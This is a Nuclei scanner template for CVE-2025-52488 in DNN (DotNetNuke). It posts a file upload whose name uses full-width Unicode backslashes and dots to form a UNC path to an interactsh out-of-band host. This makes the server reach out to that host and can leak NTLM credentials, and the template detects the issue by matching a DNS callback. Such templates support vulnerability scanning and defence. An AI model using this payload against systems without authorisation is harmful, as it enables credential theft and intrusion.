id: Microsoft-DNN-CVE-2025-52488-NTLMEDisclosure

info:
  name: Microsoft-DNN-CVE-2025-52488-NTLMEDisclosure
  author: iSee857
  severity: high
  description: |
    Microsoft-DNN-CVE-2025-52488-NTLMEDisclosure

variables:
  dnspayload: "%EF%BC%BC%EF%BC%BC{{interactsh-url}}%EF%BC%BC%EF%BC%BCc$%EF%BC%BC%EF%BC%BCan.jpg"

http:
  - raw:
      - |
        POST /Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx?PortalID=0&storageFolderID=1&overrideFiles=false HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabKrAhD8iHXns0zN

        ------WebKitFormBoundaryabKrAhD8iHXns0zN
        Content-Disposition: form-data; name="file"; filename="{{url_decode(replace(dnspayload,'.','%EF%BC%8E'))}}"
        Content-Type: image/jpeg

        md5{{randstr}}
        ------WebKitFormBoundaryabKrAhD8iHXns0zN--

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol 
        words:
          - "dns"
